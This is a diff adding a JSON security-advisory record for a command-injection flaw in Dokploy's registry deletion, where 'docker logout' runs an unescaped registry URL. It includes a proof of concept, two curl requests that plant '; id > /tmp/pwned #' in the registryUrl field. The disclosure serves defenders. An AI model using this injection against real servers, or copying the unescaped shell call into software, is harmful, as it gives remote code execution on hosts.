@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-827c-7x62-29jq",
+  "repo": {
+    "cve_id": "CVE-2026-45662",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\n\nThe `deleteRegistry` function in Dokploy (`packages/server/src/services/registry.ts`) executes `docker logout ${response.registryUrl}` without shell escaping. In the same file, the `docker login` command correctly uses `shEscape()` to prevent command injection. This inconsistency creates a command injection vulnerability when deleting a registry with a crafted `registryUrl`.\n\n### Details\n\n**SAFE code - docker login** ([registry.ts:24-27](https://github.com/Dokploy/dokploy/blob/ddfcd1a671a48b81545b97926047aa0cf965fcbd/packages/server/src/services/registry.ts#L24-L27)):\n\n```typescript\nconst escapedRegistry = shEscape(registry);\nconst escapedUser = shEscape(user);\nconst escapedPassword = shEscape(pass);\nreturn `printf %s ${escapedPassword} | docker login ${escapedRegistry} -u ${escapedUser} --password-stdin`;\n```\n\n**VULNERABLE code - docker logout** ([registry.ts:88](https://github.com/Dokploy/dokploy/blob/ddfcd1a671a48b81545b97926047aa0cf965fcbd/packages/server/src/services/registry.ts#L88)):\n\n```typescript\nawait execAsync(`docker logout ${response.registryUrl}`);\n// ^^^ NO shEscape() applied! The function exists on line 14 of the same file!\n```\n\nThe `registryUrl` parameter is validated with `z.string()` only - no regex restriction on special characters. An authenticated user can set `registryUrl` to a value containing shell metacharacters (`;`, `|`, `$()`, etc.).\n\nThe `shEscape()` function is defined on line 14 of the same file but is not applied to the `docker logout` command.\n\n### PoC\n\n```bash\n# 1. Create a registry with malicious URL\ncurl -X POST https://dokploy-instance/api/trpc/registry.create \\\n  -H \"Authorization: Bearer <token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"registryName\":\"evil\",\"username\":\"x\",\"password\":\"x\",\"registryUrl\":\"; id > /tmp/pwned #\",\"registryType\":\"cloud\",\"organizationId\":\"<org-id>\"}'\n\n# 2. Delete the registry - triggers docker logout with injected command\ncurl -X POST https://dokploy-instance/api/trpc/registry.remove \\\n  -H \"Authorization: Bearer <token>\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"registryId\":\"<registry-id>\"}'\n\n# The server executes: docker logout ; id > /tmp/pwned #\n# Result: RCE - 'id' command output written to /tmp/pwned\n```\n\n### Impact\n\n1. **Remote Code Execution**: Any authenticated user with registry management permissions can execute arbitrary OS commands on the Dokploy host\n2. **Server compromise**: Full control over the Dokploy server and all hosted applications\n3. **Lateral movement**: Access to Docker daemon enables container escape and host compromise",
+    "ghsa_id": "GHSA-827c-7x62-29jq",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-827c-7x62-29jq",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-827c-7x62-29jq"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45662"
+      }
+    ],
+    "published_at": "2026-05-11T18:37:06Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Command Injection via incomplete shell escaping in docker logout (registry deletion)",
+    "updated_at": "2026-05-13T04:43:02Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "@dokploy/server"
+        },
+        "patched_versions": null,
+        "vulnerable_version_range": "<= 0.0.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
